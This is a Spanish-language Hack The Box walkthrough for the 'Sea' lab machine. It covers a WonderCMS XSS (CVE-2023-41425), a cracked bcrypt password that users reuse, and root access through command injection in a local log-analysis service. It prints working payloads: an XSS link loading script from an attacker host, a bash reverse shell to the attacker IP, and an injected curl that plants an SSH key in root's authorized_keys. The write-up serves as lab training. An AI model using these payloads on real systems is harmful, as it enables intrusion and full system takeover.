## 📝 Descripción

Sea es una máquina vulnerable de Hack The Box que presenta varios desafíos de seguridad web e infraestructura. La máquina involucra:

- Enumeración de servicios web
- Explotación de una vulnerabilidad de Cross-Site Scripting (XSS) en WonderCMS
- Escalada de privilegios mediante técnicas de enumeración y abuso de servicios internos

## 🚀 Metodología

```mermaid
flowchart TD
    A[🔍 Reconocimiento Inicial] --> B[🌐 Escaneo de Puertos]
    B --> C[🕵️ Enumeración Web]
    C --> D[🔓 Identificación de Vulnerabilidades]
    D --> E[💥 Explotación]
    E --> F[🏠 Establecer Foothold]
    F --> G[🚪 Escalada de Privilegios]
    G --> H[🏆 Obtención de Flags]
```



## 🔭 Reconocimiento

### Ping para verificación en base a TTL

```bash
❯ ping -c2 10.10.11.28           
PING 10.10.11.28 (10.10.11.28) 56(84) bytes of data.
64 bytes from 10.10.11.28: icmp_seq=1 ttl=63 time=47.8 ms
64 bytes from 10.10.11.28: icmp_seq=2 ttl=63 time=48.3 ms

--- 10.10.11.28 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 47.811/48.033/48.256/0.222 ms
```

> 💡 **Nota**: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.

### Escaneo de puertos

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.28 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```bash
echo $ports                                                     
22,80
```
### Enumeración de servicios

```bash
nmap -sC -sV -p$ports 10.10.11.28 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:54 CEST
Nmap scan report for 10.10.11.28
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds

```


---

## 🌐 Enumeración Web

### 80 HTTP  (sea.htb)


⚠️ **Importante**: Al intentar acceder a la sección de contacto, vemos que la peticición se dirige a un vhost `sea.htb` que deberemos añadir a nuestro fichero /etc/hosts para su resolución:

```bash
echo "10.10.11.28 sea.htb" | sudo tee -a /etc/hosts
```


Activamos el interceptor de Burp y capturamos la petición del formulario:


Probamos algunas inyecciones XSS sin resultado.

#### 🕷️Fuzzing de directorios

```bash
feroxbuster -u http://sea.htb -r  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --scan-dir-listings 
```


Haciendo fuzzing de directorios de forma recursiva con la herramienta ferxobuster encontramos un par de archivos que puede que nos aporten más información sobre algún posible vector de ataque:


```
http://sea.htb/themes/bike/version
http://sea.htb/themes/bike/LICENSE
```


Revisando el código fuente del proyecto en el repositorio oficial de github vemos que también existe un fichero `README.md`


http://sea.htb/themes/bike/README.md


Este fichero nos aporta información relevante sobre que estamos ante CMS llamado WonderCMS v.3.2.0 a v.3.4.2 permite a un atacante remoto ejecutar código arbitrario a través de un script manipulado y cargado en el componente installModule mediante una vulnerabilidad de Cross Site Scripting.

https://nvd.nist.gov/vuln/detail/CVE-2023-41425


## 💻 Explotación

### 🔓 CVE-2023-41425 

Existen varios exploits públicos que permiten explotar esta vulnerabilidad:

https://github.com/duck-sec/CVE-2023-41425

Esta exploit abusa de la vulnerabilidad XSS del campo **loginURL** del CMS:


```bash
git clone https://github.com/duck-sec/CVE-2023-41425.git
```

```bash 
python3 exploit.py -u http://sea.htb/loginURL  -lh 10.10.14.6 -lp  7777  -sh 10.10.14.6 -sp 8888
```


El script nos genera la petición que deberemos proporcionar al administrador del sitio para robar su cookie de sesión y realizar la inyección:

```
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.6:8888/xss.js"></script><form+action="
```

Para ello nos vamos a servir del campo Website del formulario, el cual generará un hipervínculo y confiaremos en que el administrador que lo reciba haga click en él.


En pocos segundos veremos como se realiza la petición al recurso malicioso:


Y recibimos la reverse shell en nuestro host de ataque:


### Mejorando la shell

```bash
script /dev/null -c bash
Crtl +z 
(suspended)
stty raw -echo;fg
reset xterm
export TERM=xterm
```

En nuestro host de ataque
```bash
stty size
```

En el host comprometido
```bash
stty rows X columns Y
```


### FootHold

Enumeramos el sistema y vemos que existen 2 usuarios en el directorio /home, pero no podemos leer la primera flag en el directorio del usuario amay:

```bash
www-data@sea:/home/amay$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@sea:/home/amay$ 
```


Encontramos un archivo llamado database.js en /var/www/sea/data que contiene un hash.
```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
```

Nota: Aquí es importante revisar que se están usando caracteres para escapar la /, por lo que esto hay que tenerlo en cuenta ya que el hash tal como está no podemos intentar crackearlo, debemos eliminar previamente los caracteres "\"

```bash
mousepad hash_bcrypt
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```


```bash
hashcat -m 3200 hash_bcrypt /usr/share/wordlists/rockyou.txt
```


```
mychemicalromance
```


Ahora verificamos si está llevando a cabo la mala praxis de reutilización de contraseñas para alguno de los usuarios que hemos enumerado anteriormente (amay o geo):

Logramos autenticarnos como amay para obtener la primera flag:


```
amay@sea:~$ cat user.txt
cat user.txt
1dd****************70d5668490f2
amay@sea:~$ 
```
### 👑 Escalada de privilegios

Comprobamos si el usuario amay puede ejecutar algún comando como sudo:

```bash
sudo -l
[sudo] password for amay: mychemicalromance

Sorry, user amay may not run sudo on sea.
amay@sea:~$ 
```

Verificamos que la contraseña anterior tampoco es válida para el usuario geo:

```bash
amay@sea:~$ su geo
su geo
Password: mychemicalromance

su: Authentication failure
amay@sea:~$ 
```

No vemos que el usuario tenga ningún grupo interesante o que nos permita un posible vector para la escalada
```bash
amay@sea:/etc$ id
id
uid=1000(amay) gid=1000(amay) groups=1000(amay)
amay@sea:/etc$ 
```

Vemos si hay algún binario con privilegios SUID que pueda resultar interesante pero tampoco vemos nada:

```bash
find / -perm -4000 2>/dev/null

amay@sea:~$ find / -perm -4000 2>/dev/null   
find / -perm -4000 2>/dev/null   
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/snapd/21759/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/sudo
/usr/bin/umount
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
```

Enumeramos la versión del sistema operativo pero nada interesante tampoco
```bash
uname -a
uname -r 

amay@sea:~$ uname -a
uname -a
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
amay@sea:~$ uname -r
uname -r
5.4.0-190-generic


cat os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

```

Vemos si hay alguna capability interesante pero tampoco vemos nada:

```bash
getcap -r / 2>/dev/null
```

```bash
amay@sea:/etc$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/snap/core20/2318/usr/bin/ping = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Enumeramos servicios en ejecución y vemos un servicio ejecutándose en el puerto 8080. Este servicio parece estar ejecutándose de forma local ya que anteriormente en nuestra enumeración de puertos y servicios vimos que había únicamente dos servicios, 22 y 80.

```bash
ss -tulnp
```


Dado que tenemos la contraseña del usuario amay, podemos verificar si podemos conectarnos vía ssh con estas credenciales y vemos que sí:

```bash
ssh amay@10.10.11.28
mychemicalromance
```


En este punto se me ocurre que podemos realizar port forwading del puerto 8080 a nuestro host de ataque usando para ello el puerto ssh:

```bash
ssh -L 8081:127.0.0.1:8080 amay@10.10.11.28
```

A continuación desde nuestro host de ataque accedemos a este servicio y encontramos un panel de autenticación HTTP básica. Al probar con las credenciales amay:mychemicalromance logramos acceder:


## Explotación

No hallamos nada relevante a priori, pero sí que hay un combo que permite seleccionar el archivo del cuál quieres leer el log, vamos a revisar cómo se está realizando la petición interceptándola con Burp Suite y comprobamos que el parámetro log_file no está debidamente sanitizado y que es vulnerable a path traversal:


Sin embargo no podemos leer otros archivos, parece que se está aplicando algún tipo de filtrado. Podemos usar el carácter ; en combinación con # para evadir estos filtros de la siguiente forma:

```
log_file=/etc/passwd;whoami #&analyze_log=
```


De esta forma vemos que además de listar el contenido del fichero /etc/passwd también se ejecuta el comando whoami.

Podríamos aprovechar esto para ganar una reverse shell  de la siguiente forma:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.45/4444 0>&1'
```

Aunque necesitaremos codificarla como URL

```
log_file=/etc/passwd; bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.6/4444+0>%261' #&analyze_log=
```

Iniciamos el listener y a continuación lanzamos la petición:

```bash
nc -nlvp 4444
```


### Opción alternativa, sin usar reverse shell

Como alternativa, podemos generar un par de claves ssh usando la herraienta ssh-keygen sin definir contraseña:

```bash
sudo ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
```

A continuación, disponibilizamos  el archivo de clave pública id_rsa.pub en un servidor web con python en nuestro host de ataque:

```bash
python3 -m http.server 80
```

A continuación usando curl o wget, descargarmos el archivo .pub en el directorio /root/.ssh/authorized_keys

```
log_file=/etc/passwd; curl 10.10.14.6/id_rsa.pub -o /root/.ssh/authorized_keys #&analyze_log=
```


Si todo ha ido bien, deberíamos poder conectarnos como root al host víctima sin indicar contraseña:

```bash
ssh root@10.10.11.28
```


